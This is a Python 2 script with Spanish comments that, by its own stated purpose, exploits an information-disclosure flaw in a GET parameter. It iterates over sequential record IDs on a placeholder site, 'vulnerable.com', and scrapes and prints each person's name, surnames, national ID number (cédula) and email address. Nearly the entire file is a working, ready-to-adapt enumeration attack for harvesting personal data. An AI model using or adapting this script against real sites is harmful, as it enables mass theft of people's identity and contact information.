#!/usr/bin/env python
# -*- coding: utf-8 -*-
# Autor: @kr1shn4murt1
# Fecha: Enero 13 - 2014
# Proposito: Este script explota una vulnerabilidad de information disclosure
# en una web en un parametro get, automatiza la tarea de visitar miles de urls

import mechanize
import BeautifulSoup
import time #Para controlar cuanto demora la ejecución del script
import sys

horaInicio= time.time()
print 'Hora de inicio del script: ',time.ctime(horaInicio), '\n'

#numeros_Comparendos= 

# Numero de Dato inicial
numeroInicial= 20000100

# Numero de Dato final
numeroFinal= 20000200

# Se van obteniendo datos desde el Numero de Dato escogido hasta el final
for numeroDato in xrange (numeroInicial,numeroFinal):
	
	try:
		navegador= mechanize.Browser()

		url= 'https://vulnerable.com/index.php?id='+str(numeroDato)+'&notif=mostrar'
		#print 'probando la url: ',url

		navegador.open(url)
		
		# Imprimir respuesta de la pagina web
		
		fuente= navegador.response().read()

		#print fuente

		# Pruebas para organizar los datos
		webParseada= BeautifulSoup.BeautifulSoup(fuente)
		# webParseada.findAll(attrs={"class" : "mensaje"})[0]

		# Datos del usuario
		#datos_usuario= webParseada.findAll(attrs={"class" : "mensaje"})[10]

		nombre= webParseada.findAll(attrs={"class" : "mensaje"})[13].getText()

		apellidos= webParseada.findAll(attrs={"class" : "mensaje"})[14].getText()

		cedula= webParseada.findAll(attrs={"class" : "mensaje"})[12].getText()

		correo= webParseada.findAll(attrs={"class" : "mensaje"})[17].getText()

		print 'Numero de Dato: ', numeroDato

		print 'Nombre: ', nombre

		print 'Apellidos: ', apellidos

		print 'Cedula: ', cedula

		print 'Correo: ', correo

		print '******************************************************************************************'

	except: # Se atrapan todos los errores para que el programa no termine su ejecución al encontrar un usuario o contraseña incorrectos y se imprimen en pantalla
		e = sys.exc_info()[1]
		print 'Error detectado en la ejecucion del comparendo:',numeroDato , e

horaFin= time.time()
print 'Hora de inicio del script: ',time.ctime(horaInicio)
print 'Hora de finalización del script: ',time.ctime(horaFin)

tiempoEjecucion= horaFin-horaInicio
print '\t La ejecución tomó %s segundos'%str(tiempoEjecucion)